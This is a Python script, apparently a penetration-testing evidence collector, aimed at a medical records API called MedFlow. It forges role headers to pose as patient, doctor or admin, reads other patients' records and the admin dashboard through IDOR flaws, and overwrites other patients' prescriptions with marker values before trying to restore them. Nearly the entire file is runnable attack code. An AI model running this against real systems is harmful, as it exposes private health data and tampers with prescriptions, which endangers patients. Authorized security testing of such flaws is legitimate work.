#!/usr/bin/env python3
import sys, json, uuid, datetime, urllib.request, urllib.error

def send(method, path, role, body=None):
    url = f"https://{TARGET}:{PORT}{path}"
    hdr = {
        "Accept": "application/json",
        "x-user-id": "301",
        "x-user-role": role
    }
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        hdr["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=hdr, method=method)
    try:
        with urllib.request.urlopen(req) as resp:
            resp_body = resp.read().decode()
            status = resp.getcode()
            resp_hdr = dict(resp.getheaders())
    except urllib.error.HTTPError as e:
        resp_body = e.read().decode()
        status = e.code
        resp_hdr = dict(e.headers)
    ts = datetime.datetime.utcnow().isoformat() + "Z"
    return {
        "method": method,
        "path": path,
        "role": role,
        "request_headers": hdr,
        "request_body": body,
        "status": status,
        "response_headers": resp_hdr,
        "response_body": resp_body,
        "timestamp": ts
    }

def main():
    global TARGET, PORT
    if len(sys.argv) != 3:
        print("Usage: python3 medflow_matrix_collector.py <target> <port>")
        sys.exit(1)
    TARGET, PORT = sys.argv[1], sys.argv[2]
    evidence = []
    # Baseline patient role requests
    for p in ["/patients/1", "/patients", "/admin/dashboard"]:
        evidence.append(send("GET", p, "patient"))
    evidence.append(send("PUT", "/patients/1/prescribe", "patient", {"medication": "test"}))
    # IDOR GET tests for patients 2 and 3 with all roles
    for pid in ["2", "3"]:
        for role in ["patient", "doctor", "admin"]:
            evidence.append(send("GET", f"/patients/{pid}", role))
    # Forged elevated GETs
    for role in ["doctor", "admin"]:
        evidence.append(send("GET", "/patients", role))
        evidence.append(send("GET", "/admin/dashboard", role))
    # PUT tests with synthetic marker and state restoration
    original = {}
    for pid, role in [("2", "doctor"), ("3", "admin")]:
        # Capture original patient record
        orig_resp = send("GET", f"/patients/{pid}", role)
        evidence.append(orig_resp)
        try:
            orig_data = json.loads(orig_resp["response_body"])
        except Exception:
            orig_data = {}
        original[pid] = orig_data
        marker = uuid.uuid4().hex
        put_body = {"medication": marker}
        evidence.append(send("PUT", f"/patients/{pid}/prescribe", role, put_body))
    # Restore original medication values
    for pid, role in [("2", "doctor"), ("3", "admin")]:
        if pid in original:
            evidence.append(send("PUT", f"/patients/{pid}/prescribe", role, original[pid]))
    print(json.dumps(evidence, indent=2))
    sys.exit(0)

if __name__ == "__main__":
    main()
